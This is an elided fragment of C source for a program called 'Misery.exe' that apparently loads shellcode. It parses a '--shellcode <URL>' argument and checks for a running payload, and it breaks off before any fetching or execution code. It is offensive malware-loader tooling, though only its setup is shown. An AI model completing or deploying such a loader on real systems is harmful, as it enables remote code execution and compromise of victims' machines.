...
#define VERSION 1.0
#define SEED 5
#define PAYLOAD_CONTROL_STRING	"Misery"
...
int main(int argc, char* argv[]) {
    ...
    if (!IsPayloadRunning()) {
        ...
        for (int i = 1; i < argc; i++) {
            if (strcmp(argv[i], "--shellcode") == 0 && i + 1 < argc) {
                url = argv[i + 1];
                break;
            }
        }
        if (url == NULL) {
            printf("\n[+] Usage: Misery.exe --shellcode <URL>\n");
            return -1;
        }

        size_t url_len = strlen(url) + 1;
        wchar_t* szUrl = (wchar_t*)malloc(url_len * sizeof(wchar_t));
        mbstowcs(szUrl, url, url_len);
